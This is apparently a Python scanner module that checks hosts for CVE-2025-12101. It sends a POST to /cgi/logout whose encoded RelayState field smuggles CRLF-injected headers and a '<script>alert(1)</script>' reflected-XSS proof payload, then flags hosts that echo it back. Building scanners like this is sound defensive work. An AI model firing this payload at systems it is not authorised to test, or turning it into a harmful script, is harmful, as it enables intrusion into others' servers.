from __future__ import annotations

import re
import socket
import ssl
from dataclasses import asdict, dataclass
from datetime import datetime, timezone

from .utils import Target

# ANSI colors
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
CYAN = "\033[36m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Body EXACTLY as provided in your original script
BODY = (
    "SAMLResponse=PD94bWwgdmVyc2lvbj0iMS4wIj8%2BPHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2Fz"
    "aXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiIElEPSJ0ZXN0IiBWZXJzaW9uPSIyLjAiPjxzYW1sOkFzc2Vy"
    "dGlvbiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0idGVzdCIg"
    "VmVyc2lvbj0iMi4wIj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD50ZXN0QGV4YW1wbGUuY29tPC9zYW1sOk5h"
    "bWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U%2B&RelayState=DQpD"
    "b250ZW50LVR5cGU6IHRleHQvaHRtbA0KDQoNCjxzY3JpcHQ%2bYWxlcnQoMSk8L3NjcmlwdD4%3d"
)

PAYLOAD = "<script>alert(1)</script>"


@dataclass
class ScanResult:
    target: str
    host: str
    port: int
    scheme: str
    status_code: int | None
    reflected: bool
    vulnerable: bool
    error: str | None
    timestamp_utc: str

    def to_dict(self) -> dict:
        return asdict(self)


def _build_request(host: str, body: str, extra_headers: dict[str, str] | None) -> bytes:
    body_bytes = body.encode("ascii")
    content_length = len(body_bytes)

    headers = {
        "Host": host,
        "User-Agent": "CVE-2025-12101-Scanner",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": str(content_length),
        "Connection": "close",
    }

    if extra_headers:
        # Extra headers override defaults if same key is used
        headers.update(extra_headers)

    head = "POST /cgi/logout HTTP/1.1\r\n"
    for k, v in headers.items():
        head += f"{k}: {v}\r\n"
    head += "\r\n"

    return head.encode("ascii") + body_bytes


def _recv_all(sock: ssl.SSLSocket, chunk_size: int = 4096) -> str:
    data = b""
    while True:
        try:
            chunk = sock.recv(chunk_size)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    return data.decode("utf-8", errors="ignore")


def _status_code_from_response(resp: str) -> int | None:
    m = re.search(r"HTTP/\d\.\d\s+(\d+)", resp)
    if not m:
        return None
    try:
        return int(m.group(1))
    except ValueError:
        return None


def scan_target(
    target: Target,
    timeout: int = 15,
    extra_headers: dict[str, str] | None = None,
    show_raw: bool = False,
) -> tuple[ScanResult, str | None]:
    """
    Returns: (ScanResult, raw_response_or_none)
    """
    now = datetime.now(timezone.utc).isoformat()

    ctx = ssl.create_default_context()

    try:
        raw_sock = socket.create_connection((target.host, target.port), timeout=timeout)
        sock = ctx.wrap_socket(raw_sock, server_hostname=target.host)
        sock.settimeout(timeout)
    except Exception as e:
        return (
            ScanResult(
                target=target.raw,
                host=target.host,
                port=target.port,
                scheme=target.scheme,
                status_code=None,
                reflected=False,
                vulnerable=False,
                error=f"Connection error: {e}",
                timestamp_utc=now,
            ),
            None,
        )

    raw_response: str | None = None
    try:
        request = _build_request(target.host, BODY, extra_headers)
        sock.sendall(request)
        raw_response = _recv_all(sock)
    except Exception as e:
        return (
            ScanResult(
                target=target.raw,
                host=target.host,
                port=target.port,
                scheme=target.scheme,
                status_code=None,
                reflected=False,
                vulnerable=False,
                error=f"Request error: {e}",
                timestamp_utc=now,
            ),
            raw_response if show_raw else None,
        )
    finally:
        try:
            sock.close()
        except Exception:
            pass

    status_code = _status_code_from_response(raw_response or "")
    reflected = (raw_response is not None) and (PAYLOAD in raw_response)
    vulnerable = bool(status_code in (200, 302) and reflected)

    return (
        ScanResult(
            target=target.raw,
            host=target.host,
            port=target.port,
            scheme=target.scheme,
            status_code=status_code,
            reflected=reflected,
            vulnerable=vulnerable,
            error=None,
            timestamp_utc=now,
        ),
        raw_response if show_raw else None,
    )


def print_result_human(result: ScanResult, raw_response: str | None = None) -> None:
    print(f"{CYAN}{BOLD}[*] Testing target: {result.host}:{result.port}{RESET}")

    if result.error:
        print(f"{RED}[!] {result.error}{RESET}")
        return

    if raw_response is not None:
        print(f"\n{YELLOW}{BOLD}===== RAW HTTP RESPONSE BEGIN ====={RESET}")
        print(raw_response)
        print(f"{YELLOW}{BOLD}===== RAW HTTP RESPONSE END ====={RESET}\n")

    print(f"{CYAN}[+] HTTP status code: {result.status_code}{RESET}")
    print(f"{CYAN}[+] Payload reflected: {result.reflected}{RESET}")

    if result.vulnerable:
        print(f"\n{GREEN}{BOLD}[VULNERABLE]{RESET} {GREEN}{result.host}{RESET}")
    else:
        print(f"\n{BOLD}{RED}[INFO]{RESET} {RED}No vulnerable behaviour detected.{RESET}")
